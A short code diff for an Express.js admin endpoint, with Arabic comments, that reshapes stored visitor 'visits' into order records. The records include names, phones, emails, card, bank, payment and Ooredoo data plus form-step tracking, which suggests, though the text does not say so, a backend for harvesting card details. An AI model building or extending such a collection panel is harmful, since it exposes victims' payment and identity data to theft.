@@ -92,35 +92,17 @@ app.get('/api/admin/orders', (req, res) => {
   const ordersList = Object.values(visits).map(v => {
     // معالجة البيانات حسب النموذج المتوقع
     return {
-      ref: v.visitId,           // معرّف الطلب
-      ts: v.createdAt || v.updatedAt || Date.now(),  // الوقت
-      status: v.status || 'active',  // الحالة
-      // معلومات شخصية
+      ...v, // دمج جميع بيانات الزيارة
+      // تأكيد الحقول الأساسية بشكل صريح (تكتب فوق spread للضمان)
+      ref: v.visitId,           // معرّف الطلب دائماً هو visitId
+      ts: v.createdAt || v.updatedAt || Date.now(),
+      status: v.status || 'active',
       n: v.name || v.n || 'بدون اسم',
       p: v.phone || v.p || '',
       e: v.email || v.e || '',
-      g: v.gender || v.g || '',
-      id: v.id || '',
-      // البيانات الجغرافية
-      em: v.emirate || v.em || '',
-      a: v.area || v.a || '',
-      ad: v.address || v.ad || '',
-      st: v.status_type || v.st || '',
-      // البيانات المتعلقة بالطلب
-      card: v.card || '',
-      cardName: v.cardName || '',
-      watch: v.watch || '',
-      watchName: v.watchName || '',
-      bank: v.bank || '',
-      bankName: v.bankName || '',
       step: v.step || 'form',
-      // بيانات الدفع
       pay: v.pay || null,
       ooredoo: v.ooredoo || null,
-      // معلومات أخرى
-      page: v.page || '',
-      lang: v.lang || 'ar',
-      ...v // دمج أي بيانات إضافية
     };
   });
 
